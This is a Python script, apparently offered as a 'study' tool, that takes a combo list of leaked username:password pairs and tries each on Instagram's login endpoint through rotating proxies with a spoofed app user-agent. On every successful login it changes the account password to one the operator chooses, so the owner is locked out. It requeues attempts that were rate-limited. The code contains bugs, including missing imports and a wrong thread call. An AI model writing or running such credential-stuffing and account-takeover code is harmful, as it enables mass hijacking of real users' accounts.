try:
    import requests
    import threading
    from queue import Queue
    import time
except Exception as e:
    print(e)
    input("")
    sys.exit()
'''
    Mexaw Alotebi  PasswordChange @31421
    For Study purpose :)  
'''
counter = 0 
url_change = "https://www.instagram.com/accounts/password/change/"
qa = int(input("[+] 1 - Proxies (threads) 2 - No Proxies [+]:"))
qa_password = str(input("enter Your Password:"))
if qa  == 1:
    proxies = True
else:
    proxies = False
q = Queue()
class KingMexaw():
    def __init__(self,username,password):
        global counter
        self.username = username
        self.password = password
        self.data_change = {"enc_old_password":"#PWD_INSTAGRAM_BROWSER:0:1589682409:"+self.password,"enc_new_password1":"#PWD_INSTAGRAM_BROWSER:0:1589682409:"+qa_password,"enc_new_password2":"#PWD_INSTAGRAM_BROWSER:0:1589682409:"+qa_password}
        self.loginstart()


    def loginstart(self):
        MySession = requests.Session()
        url = "https://i.instagram.com/accounts/login/ajax/"
        loginuseragent = "Instagram 93.1.0.19.102 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)"
        MySession.headers = {'user-agent': loginuseragent}
        MySession.headers.update({'Referer': 'https://i.instagram.com/'})
        sreq = MySession.get("https://i.instagram.com")
        MySession.headers.update({'X-CSRFToken': sreq.cookies['csrftoken']})
        data = {"username":user,"enc_password":"#PWD_INSTAGRAM_BROWSER:0:1589682409:"+password,"queryParams":"{}","optIntoOneTap":"false"} 
        if proxies == True:
            
            pro = str(random.choice(proxylist))
            NewProxies = {
            'http': 'http://{}'.format(pro),
            'https': 'http://{}'.format(pro)
            }

            MySession.proxies = NewProxies
        loginreq = MySession.post(url, data=data, allow_redirects=True,timeout=10)
        print(loginreq.text)
        if "userId" in loginreq.text:
            print(f"[+] LOGIN WORKS {self.username}:{self.password}[+]")
            MySession.headers.update(
                {"X-CSRFToken":MySession.cookies["csrftoken"],
                "method":"POST",
                "path":"/accounts/password/change/",
                "scheme":"https",
                "accept":"*/*",
                "referer": "https://www.instagram.com/accounts/password/change/",
                "user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
                })
            change_requests = MySession.post(url_change,data=self.data_change).text
            print(change_requests)
            counter +=1
        elif loginreq.status_code == 429:
            q.put(username+":"+password)
        if proxies == False:
            time.sleep(6)
        else:
            time.sleep(2)
        print(f"Works:{counter}",end="\r")
        
    
try:
    proxylist = open("proxy.txt","r").read().splitlines()
except:
    print("Please Create Proxy.txt")
    input("Enter To exit")
    sys.exit()
def send_Login():
    while True:

        send = str(q.get())
        combo_unpack = send.split(":")
        user = combo_unpack[0]
        password = combo_unpack[1]
        KingMexaw(user,password)
        q.task_done()
combo = open("combo.txt","r").read().splitlines()
size_of_combo = len(combo)
if proxies == True:
    try:

        if size_of_combo>=20:
            for i in range(5):

                t = threading.Thread(send_Login)
                t.daemon = True
                t.start()
        else:
            for i in range(1):
                t = threading.Thread(send_Login)
                t.daemon = True
                t.start()


    except:
        print("[+] create combo.txt or just combo :) [+]")
else:
    proxies = False
    
    for i in combo:
        combo_unpack = i.split(":")
        user = combo_unpack[0]
        password = combo_unpack[1]
        KingMexaw(user,password)


